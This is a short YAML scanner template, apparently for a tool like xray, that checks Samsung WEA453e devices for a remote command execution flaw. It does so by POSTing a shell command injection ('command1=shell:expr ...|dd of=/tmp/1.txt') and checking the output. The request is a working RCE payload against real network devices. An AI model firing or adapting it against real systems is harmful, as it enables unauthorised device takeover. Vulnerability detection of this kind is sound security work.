expression: r0()
id: samsung-wea453e-rce
info:
  author: sharecast
  name: Samsung Wea453e RCE
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      - r2)))
    request:
      body: 'command1=shell%3Aexpr {{r1}} - {{r2}}|dd of=/tmp/1.txt

        '
      method: POST
      path: /(download)/tmp/1.txt
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(1140000, 1144800)
